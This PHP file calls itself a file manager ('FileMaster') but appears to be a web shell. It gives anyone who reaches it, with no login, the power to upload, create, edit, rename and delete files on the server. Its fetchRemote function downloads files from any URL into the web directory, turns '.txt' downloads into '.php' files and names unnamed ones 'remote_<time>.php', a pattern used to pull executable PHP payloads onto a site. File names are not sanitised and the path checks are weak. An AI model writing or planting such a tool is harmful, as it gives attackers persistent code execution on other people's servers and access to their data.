<?php
// Enhanced PHP File Manager, compatible with PHP 5.6+

class FileManager
{
    private $basePath;

    public function __construct($basePath = null)
    {
        if ($basePath === null) {
            $basePath = __DIR__;
        }
        $realBase = realpath($basePath);
        if ($realBase === false) {
            $realBase = $basePath;
        }
        $this->basePath = rtrim(str_replace('\\', '/', $realBase), '/');
    }

    public function getFullPath($path)
    {
        $path = str_replace('\\', '/', urldecode($path));

        if (strpos($path, $this->basePath) === 0) {
            return rtrim($path, '/');
        }

        if (strpos($path, '/') === 0) {
            return rtrim($this->basePath . $path, '/');
        }

        return rtrim($this->basePath . '/' . $path, '/');
    }

    public function isSafePath($path)
    {
        $real = realpath($path);
        if (!$real) return false;
        return strpos($real, $this->basePath) === 0;
    }

    public function listDir($dir)
    {
        $fullPath = $this->getFullPath($dir);
        if (!is_dir($fullPath)) {
            return array();
        }

        $items = scandir($fullPath);
        $items = array_filter($items, function ($v) {
            return ($v !== '.' && $v !== '..');
        });

        usort($items, function ($a, $b) use ($fullPath) {
            $aIsDir = is_dir($fullPath . '/' . $a);
            $bIsDir = is_dir($fullPath . '/' . $b);
            if ($aIsDir !== $bIsDir) {
                return $aIsDir ? -1 : 1;
            }
            return strcasecmp($a, $b);
        });

        return $items;
    }

    public function readFile($file)
    {
        $fullPath = $this->getFullPath($file);
        if (!$this->isSafePath($fullPath) || !is_file($fullPath)) {
            return false;
        }
        return @file_get_contents($fullPath);
    }

    public function saveFile($file, $content)
    {
        $fullPath = $this->getFullPath($file);
        if (!$this->isSafePath($fullPath) || !is_file($fullPath)) {
            return false;
        }
        return @file_put_contents($fullPath, $content) !== false;
    }

    public function createFile($dir, $filename, $content)
    {
        $dirPath = $this->getFullPath($dir);
        if (!$this->isSafePath($dirPath) || !is_dir($dirPath)) {
            return array('success' => false, 'message' => 'Invalid directory');
        }

        $filePath = $dirPath . '/' . $filename;
        if (file_exists($filePath)) {
            return array('success' => false, 'message' => 'File already exists');
        }

        $res = @file_put_contents($filePath, $content);
        if ($res !== false) {
            return array('success' => true, 'path' => $filePath);
        }
        return array('success' => false, 'message' => 'File creation failed');
    }

    public function createDir($dir, $name)
    {
        $dirPath = $this->getFullPath($dir);
        if (!$this->isSafePath($dirPath) || !is_dir($dirPath)) {
            return array('success' => false, 'message' => 'Invalid parent directory');
        }

        $newDir = $dirPath . '/' . $name;
        if (file_exists($newDir)) {
            return array('success' => false, 'message' => 'Folder already exists');
        }

        if (@mkdir($newDir, 0755)) {
            return array('success' => true, 'path' => $newDir);
        }
        return array('success' => false, 'message' => 'Folder creation failed');
    }

    public function deleteFile($file)
    {
        $filePath = $this->getFullPath($file);
        if (!$this->isSafePath($filePath) || !is_file($filePath)) {
            return array('success' => false, 'message' => 'Invalid or non-existent file');
        }
        if (@unlink($filePath)) {
            return array('success' => true);
        }
        return array('success' => false, 'message' => 'File deletion failed');
    }

    public function deleteDir($dir)
    {
        $dirPath = $this->getFullPath($dir);
        if (!$this->isSafePath($dirPath) || !is_dir($dirPath)) {
            return array('success' => false, 'message' => 'Invalid or non-existent folder');
        }

        if (count(scandir($dirPath)) > 2) {
            return array('success' => false, 'message' => 'Folder is not empty');
        }

        if (@rmdir($dirPath)) {
            return array('success' => true);
        }
        return array('success' => false, 'message' => 'Folder deletion failed');
    }

    public function rename($oldPath, $newName)
    {
        $oldFull = $this->getFullPath($oldPath);
        if (!$this->isSafePath($oldFull) || !file_exists($oldFull)) {
            return array('success' => false, 'message' => 'Invalid source file/folder');
        }

        $newFull = dirname($oldFull) . '/' . $newName;
        if (file_exists($newFull)) {
            return array('success' => false, 'message' => 'Target already exists');
        }
        if (@rename($oldFull, $newFull)) {
            return array('success' => true, 'path' => $newFull);
        }
        return array('success' => false, 'message' => 'Rename failed');
    }

    public function fetchRemote($url, $dir)
    {
        $dirPath = $this->getFullPath($dir);
        if (!$this->isSafePath($dirPath) || !is_dir($dirPath)) {
            return array('success' => false, 'message' => 'Invalid directory');
        }

        $fileName = basename(parse_url($url, PHP_URL_PATH));
        if (!$fileName) {
            $fileName = 'remote_' . time() . '.php';
        }

        if (strtolower(pathinfo($fileName, PATHINFO_EXTENSION)) === 'txt') {
            $fileName = pathinfo($fileName, PATHINFO_FILENAME) . '.php';
        }

        $filePath = $dirPath . '/' . $fileName;
        if (file_exists($filePath)) {
            return array('success' => false, 'message' => "File already exists: $fileName");
        }

        $content = @file_get_contents($url);
        if ($content === false) {
            return array('success' => false, 'message' => 'Failed to fetch remote file');
        }

        if (@file_put_contents($filePath, $content) === false) {
            return array('success' => false, 'message' => 'File save failed');
        }

        return array('success' => true, 'path' => $filePath);
    }

    public function upload($file, $dir)
    {
        $dirPath = $this->getFullPath($dir);
        if (!$this->isSafePath($dirPath) || !is_dir($dirPath)) {
            return array('success' => false, 'message' => 'Invalid upload directory');
        }

        $target = $dirPath . '/' . basename($file['name']);
        if (file_exists($target)) {
            return array('success' => false, 'message' => 'File already exists');
        }

        if (@move_uploaded_file($file['tmp_name'], $target)) {
            return array('success' => true, 'path' => $target);
        }

        return array('success' => false, 'message' => 'File upload failed');
    }

    public function search($dir, $term)
    {
        $dirPath = $this->getFullPath($dir);
        if (!$this->isSafePath($dirPath) || !is_dir($dirPath)) {
            return false;
        }

        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($iterator as $item) {
            if (stripos($item->getFilename(), $term) !== false) {
                return $item->getPathname();
            }
        }
        return false;
    }

    public function previewFile($file)
    {
        $fullPath = $this->getFullPath($file);
        if (!$this->isSafePath($fullPath) || !is_file($fullPath)) {
            return false;
        }
        $content = @file_get_contents($fullPath);
        if ($content === false) {
            return false;
        }
        return substr($content, 0, 500); // Limit preview to 500 characters
    }
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';

function cleanPath($path)
{
    $path = str_replace(array('\\', '..'), array('/', ''), $path);
    return rtrim($path, '/');
}

$dir = cleanPath($dir);

$fileManager = new FileManager();

$flash = '';
$flashType = 'info';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    
    if ($action === 'create_file') {
        $filename = isset($_POST['filename']) ? trim($_POST['filename']) : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if ($filename === '') {
            $flash = 'File name cannot be empty';
            $flashType = 'error';
        } else {
            $res = $fileManager->createFile($dir, $filename, $content);
            $flash = $res['success'] ? 'File created successfully' : ('Error: ' . $res['message']);
            $flashType = $res['success'] ? 'success' : 'error';
        }
    }
    elseif ($action === 'create_dir') {
        $dirname = isset($_POST['dirname']) ? trim($_POST['dirname']) : '';
        if ($dirname === '') {
            $flash = 'Folder name cannot be empty';
            $flashType = 'error';
        } else {
            $res = $fileManager->createDir($dir, $dirname);
            $flash = $res['success'] ? 'Folder created successfully' : ('Error: ' . $res['message']);
            $flashType = $res['success'] ? 'success' : 'error';
        }
    }
    elseif ($action === 'delete_file') {
        $target = isset($_POST['target']) ? cleanPath($_POST['target']) : '';
        $res = $fileManager->deleteFile($target);
        $flash = $res['success'] ? 'File deleted successfully' : ('Error: ' . $res['message']);
        $flashType = $res['success'] ? 'success' : 'error';
    }
    elseif ($action === 'delete_dir') {
        $target = isset($_POST['target']) ? cleanPath($_POST['target']) : '';
        $res = $fileManager->deleteDir($target);
        $flash = $res['success'] ? 'Folder deleted successfully' : ('Error: ' . $res['message']);
        $flashType = $res['success'] ? 'success' : 'error';
    }
    elseif ($action === 'rename') {
        $old = isset($_POST['old']) ? cleanPath($_POST['old']) : '';
        $newName = isset($_POST['new']) ? trim($_POST['new']) : '';
        if ($newName === '') {
            $flash = 'New name cannot be empty';
            $flashType = 'error';
        } else {
            $res = $fileManager->rename($old, $newName);
            $flash = $res['success'] ? 'Renamed successfully' : ('Error: ' . $res['message']);
            $flashType = $res['success'] ? 'success' : 'error';
        }
    }
    elseif ($action === 'save_file') {
        $file = isset($_POST['file']) ? cleanPath($_POST['file']) : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $res = $fileManager->saveFile($file, $content);
        $flash = $res ? 'File saved successfully' : 'File save failed';
        $flashType = $res ? 'success' : 'error';
    }
    elseif ($action === 'fetch_remote') {
        $url = isset($_POST['url']) ? trim($_POST['url']) : '';
        if (filter_var($url, FILTER_VALIDATE_URL)) {
            $res = $fileManager->fetchRemote($url, $dir);
            $flash = $res['success'] ? 'Remote file fetched successfully' : ('Error: ' . $res['message']);
            $flashType = $res['success'] ? 'success' : 'error';
        } else {
            $flash = 'Invalid URL';
            $flashType = 'error';
        }
    }
    elseif (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
        $res = $fileManager->upload($_FILES['upload'], $dir);
        $flash = $res['success'] ? 'File uploaded successfully' : ('Error: ' . $res['message']);
        $flashType = $res['success'] ? 'success' : 'error';
    }

    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) . '&flash=' . urlencode($flash) . '&flash_type=' . urlencode($flashType));
    exit;
}

if (isset($_GET['flash'])) {
    $flash = $_GET['flash'];
    $flashType = isset($_GET['flash_type']) ? $_GET['flash_type'] : 'info';
}

$searchTerm = isset($_GET['search']) ? trim($_GET['search']) : '';
$searchResult = false;
if ($searchTerm !== '') {
    $searchResult = $fileManager->search($dir, $searchTerm);
}
$items = $fileManager->listDir($dir);

function breadcrumbs($path)
{
    $path = trim(str_replace('\\', '/', $path), '/');
    if ($path === '') {
        return array(array('name' => 'Home', 'path' => '.'));
    }

    $parts = explode('/', $path);
    $crumbs = array();
    $acc = '';
    foreach ($parts as $part) {
        $acc .= ($acc === '' ? '' : '/') . $part;
        $crumbs[] = array('name' => $part, 'path' => $acc);
    }
    array_unshift($crumbs, array('name' => 'Home', 'path' => '.'));
    return $crumbs;
}

function sizeFormatted($bytes)
{
    if ($bytes < 1024) return $bytes . ' B';
    $units = array('KB', 'MB', 'GB', 'TB');
    $power = floor(log($bytes, 1024));
    $power = ($power > count($units)) ? count($units) : $power;
    $value = round($bytes / pow(1024, $power), 2);
    return $value . ' ' . $units[$power - 1];
}

function h($s)
{
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FileMaster</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .file-preview { max-height: 200px; overflow-y: auto; }
        .dark-mode-toggle { cursor: pointer; }
        .folder-icon::before { content: "\1F4C1 "; }
        .file-icon::before { content: "\1F4C4 "; }
    </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100 min-h-screen transition-colors duration-300">
    <header class="bg-gray-800 dark:bg-gray-950 p-4 flex justify-between items-center">
        <h1 class="text-xl font-bold text-white"><a href="<?= h($_SERVER['PHP_SELF']) ?>">FileMaster</a></h1>
        <div class="flex items-center space-x-4">
            <form method="get" class="flex items-center">
                <input type="hidden" name="dir" value="<?= h($dir) ?>">
                <input type="text" name="search" placeholder="Search files..." value="<?= h($searchTerm) ?>" required class="p-2 rounded-l-md bg-gray-700 text-white border-none focus:outline-none focus:ring-2 focus:ring-blue-500">
                <button type="submit" class="p-2 bg-blue-600 rounded-r-md text-white hover:bg-blue-700">Search</button>
            </form>
            <button id="darkModeToggle" class="dark-mode-toggle p-2 bg-gray-700 rounded-md text-white hover:bg-gray-600">Toggle Dark Mode</button>
        </div>
    </header>

    <main class="container mx-auto p-6">
        <?php if ($flash): ?>
            <div class="p-4 mb-6 rounded-md <?= $flashType === 'success' ? 'bg-green-600' : ($flashType === 'error' ? 'bg-red-600' : 'bg-blue-600') ?> text-white">
                <?= h($flash) ?>
            </div>
        <?php endif; ?>

        <nav class="mb-6">
            <?php $crumbs = breadcrumbs($dir); ?>
            <div class="flex space-x-2 text-sm">
                <?php foreach ($crumbs as $i => $c): ?>
                    <?php if ($i > 0): ?><span class="text-gray-500 dark:text-gray-400">/</span><?php endif; ?>
                    <a href="?dir=<?= urlencode($c['path']) ?>" class="text-blue-600 dark:text-blue-400 hover:underline"><?= h($c['name']) ?></a>
                <?php endforeach; ?>
            </div>
        </nav>

        <?php if ($searchTerm !== ''): ?>
            <div class="mb-6">
                <h2 class="text-lg font-semibold">Search Results</h2>
                <?php if ($searchResult !== false):
                    $foundDir = dirname($searchResult);
                    $foundFile = basename($searchResult);
                ?>
                    <p>
                        File found:<br>
                        <a href="?dir=<?= urlencode($foundDir) ?>" class="text-blue-600 dark:text-blue-400 hover:underline"><?= h($foundDir) ?></a> /
                        <a href="?dir=<?= urlencode($foundDir) ?>&view=<?= urlencode($searchResult) ?>" class="text-blue-600 dark:text-blue-400 hover:underline"><?= h($foundFile) ?></a>
                    </p>
                <?php else: ?>
                    <p class="text-red-500 dark:text-red-400">No files found.</p>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <?php if (isset($_GET['view'])):
            $viewFile = cleanPath($_GET['view']);
            $content = $fileManager->readFile($viewFile);
        ?>
            <h2 class="text-2xl font-semibold mb-4">Edit File: <?= h(basename($viewFile)) ?></h2>
            <?php if ($content === false): ?>
                <p class="text-red-500 dark:text-red-400">File cannot be opened or does not exist.</p>
            <?php else: ?>
                <form method="post" class="mb-4">
                    <input type="hidden" name="action" value="save_file">
                    <input type="hidden" name="file" value="<?= h($viewFile) ?>">
                    <textarea name="content" rows="20" class="w-full p-2 bg-gray-200 dark:bg-gray-800 text-gray-900 dark:text-gray-100 rounded-md font-mono"><?= h($content) ?></textarea>
                    <div class="mt-4">
                        <button type="submit" class="p-2 bg-blue-600 rounded-md text-white hover:bg-blue-700">Save</button>
                        <a href="?dir=<?= urlencode($dir) ?>" class="p-2 bg-gray-600 rounded-md text-white hover:bg-gray-700">Back</a>
                    </div>
                </form>
            <?php endif; ?>

        <?php else: ?>
            <h2 class="text-2xl font-semibold mb-4">Directory: <?= h($dir) ?></h2>

            <div class="overflow-x-auto">
                <table class="w-full border-collapse bg-white dark:bg-gray-800 rounded-md shadow">
                    <thead>
                        <tr class="bg-gray-200 dark:bg-gray-700">
                            <th class="p-3 text-left">Name</th>
                            <th class="p-3 text-left">Type</th>
                            <th class="p-3 text-left">Size</th>
                            <th class="p-3 text-left">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($dir !== '.'): 
                            $parentDir = dirname($dir);
                        ?>
                            <tr>
                                <td colspan="4" class="p-3"><a href="?dir=<?= urlencode($parentDir) ?>" class="text-blue-600 dark:text-blue-400 hover:underline">← Parent Directory</a></td>
                            </tr>
                        <?php endif; ?>

                        <?php foreach ($items as $item):
                            $itemPath = $dir . '/' . $item;
                            $fullPath = $fileManager->getFullPath($itemPath);
                            $isDir = is_dir($fullPath);
                            $size = $isDir ? '-' : sizeFormatted(filesize($fullPath));
                            $preview = !$isDir ? $fileManager->previewFile($itemPath) : false;
                        ?>
                            <tr class="hover:bg-gray-100 dark:hover:bg-gray-700">
                                <td class="p-3">
                                    <?= $isDir ? '<span class="folder-icon"></span>' : '<span class="file-icon"></span>' ?>
                                    <?php if ($isDir): ?>
                                        <a href="?dir=<?= urlencode($itemPath) ?>" class="text-blue-600 dark:text-blue-400 hover:underline"><?= h($item) ?></a>
                                    <?php else: ?>
                                        <a href="?dir=<?= urlencode(dirname($itemPath)) ?>&view=<?= urlencode($itemPath) ?>" class="text-blue-600 dark:text-blue-400 hover:underline"><?= h($item) ?></a>
                                        <?php if ($preview !== false): ?>
                                            <button onclick="showPreview('<?= h(addslashes($preview)) ?>')" class="ml-2 text-sm text-gray-500 hover:text-gray-700 dark:hover:text-gray-300">Preview</button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                </td>
                                <td class="p-3"><?= $isDir ? 'Folder' : 'File' ?></td>
                                <td class="p-3"><?= $size ?></td>
                                <td class="p-3">
                                    <?php if ($isDir): ?>
                                        <form method="post" class="inline" onsubmit="return confirm('Delete folder (if empty)?')">
                                            <input type="hidden" name="action" value="delete_dir">
                                            <input type="hidden" name="target" value="<?= h($itemPath) ?>">
                                            <button type="submit" class="p-2 bg-red-600 rounded-md text-white hover:bg-red-700">Delete</button>
                                        </form>
                                    <?php else: ?>
                                        <form method="post" class="inline" onsubmit="return confirm('Delete file?')">
                                            <input type="hidden" name="action" value="delete_file">
                                            <input type="hidden" name="target" value="<?= h($itemPath) ?>">
                                            <button type="submit" class="p-2 bg-red-600 rounded-md text-white hover:bg-red-700">Delete</button>
                                        </form>
                                    <?php endif; ?>
                                    <button onclick="showRenameForm('<?= h(addslashes($itemPath)) ?>', '<?= h(addslashes($item)) ?>')" class="p-2 bg-yellow-600 rounded-md text-white hover:bg-yellow-700">Rename</button>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

            <div class="mt-6 grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="bg-white dark:bg-gray-800 p-6 rounded-md shadow">
                    <h3 class="text-lg font-semibold mb-4">Create New File</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="create_file">
                        <label class="block mb-2 font-medium">File Name:</label>
                        <input type="text" name="filename" required class="w-full p-2 bg-gray-200 dark:bg-gray-700 text-gray-900 dark:text-gray-100 rounded-md">
                        <label class="block mb-2 mt-4 font-medium">Content:</label>
                        <textarea name="content" rows="5" class="w-full p-2 bg-gray-200 dark:bg-gray-700 text-gray-900 dark:text-gray-100 rounded-md font-mono"></textarea>
                        <button type="submit" class="mt-4 p-2 bg-blue-600 rounded-md text-white hover:bg-blue-700">Create</button>
                    </form>
                </div>

                <div class="bg-white dark:bg-gray-800 p-6 rounded-md shadow">
                    <h3 class="text-lg font-semibold mb-4">Create New Folder</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="create_dir">
                        <label class="block mb-2 font-medium">Folder Name:</label>
                        <input type="text" name="dirname" required class="w-full p-2 bg-gray-200 dark:bg-gray-700 text-gray-900 dark:text-gray-100 rounded-md">
                        <button type="submit" class="mt-4 p-2 bg-blue-600 rounded-md text-white hover:bg-blue-700">Create</button>
                    </form>
                </div>

                <div class="bg-white dark:bg-gray-800 p-6 rounded-md shadow">
                    <h3 class="text-lg font-semibold mb-4">Fetch Remote File</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="fetch_remote">
                        <label class="block mb-2 font-medium">URL:</label>
                        <input type="url" name="url" placeholder="https://example.com/file.php" required class="w-full p-2 bg-gray-200 dark:bg-gray-700 text-gray-900 dark:text-gray-100 rounded-md">
                        <button type="submit" class="mt-4 p-2 bg-blue-600 rounded-md text-white hover:bg-blue-700">Fetch</button>
                    </form>
                </div>

                <div class="bg-white dark:bg-gray-800 p-6 rounded-md shadow">
                    <h3 class="text-lg font-semibold mb-4">Upload File</h3>
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="action" value="upload">
                        <input type="file" name="upload" required class="w-full p-2 bg-gray-200 dark:bg-gray-700 text-gray-900 dark:text-gray-100 rounded-md">
                        <button type="submit" class="mt-4 p-2 bg-blue-600 rounded-md text-white hover:bg-blue-700">Upload</button>
                    </form>
                </div>
            </div>

            <div id="renameFormContainer" class="hidden mt-6 bg-white dark:bg-gray-800 p-6 rounded-md shadow">
                <form method="post" id="renameForm">
                    <input type="hidden" name="action" value="rename">
                    <input type="hidden" name="old" id="renameOld">
                    <label for="renameNew" class="block mb-2 font-medium">New Name:</label>
                    <input type="text" name="new" id="renameNew" required class="w-full p-2 bg-gray-200 dark:bg-gray-700 text-gray-900 dark:text-gray-100 rounded-md">
                    <div class="mt-4 flex space-x-4">
                        <button type="submit" class="p-2 bg-blue-600 rounded-md text-white hover:bg-blue-700">Save</button>
                        <button type="button" onclick="hideRenameForm()" class="p-2 bg-gray-600 rounded-md text-white hover:bg-gray-700">Cancel</button>
                    </div>
                </form>
            </div>

            <div id="previewModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
                <div class="bg-white dark:bg-gray-800 p-6 rounded-md max-w-lg w-full">
                    <h3 class="text-lg font-semibold mb-4">File Preview</h3>
                    <pre id="previewContent" class="file-preview bg-gray-200 dark:bg-gray-700 p-4 rounded-md"></pre>
                    <button onclick="hidePreview()" class="mt-4 p-2 bg-gray-600 rounded-md text-white hover:bg-gray-700">Close</button>
                </div>
            </div>
        <?php endif; ?>
    </main>

    <script>
        function showRenameForm(oldPath, oldName) {
            document.getElementById('renameOld').value = oldPath;
            document.getElementById('renameNew').value = oldName;
            document.getElementById('renameFormContainer').style.display = 'block';
            document.getElementById('renameNew').focus();
        }

        function hideRenameForm() {
            document.getElementById('renameFormContainer').style.display = 'none';
        }

        function showPreview(content) {
            document.getElementById('previewContent').textContent = content;
            document.getElementById('previewModal').classList.remove('hidden');
        }

        function hidePreview() {
            document.getElementById('previewModal').classList.add('hidden');
        }

        document.getElementById('darkModeToggle').addEventListener('click', () => {
            document.documentElement.classList.toggle('dark');
            localStorage.setItem('darkMode', document.documentElement.classList.contains('dark'));
        });

        if (localStorage.getItem('darkMode') === 'true') {
            document.documentElement.classList.add('dark');
        }
    </script>
</body>
</html>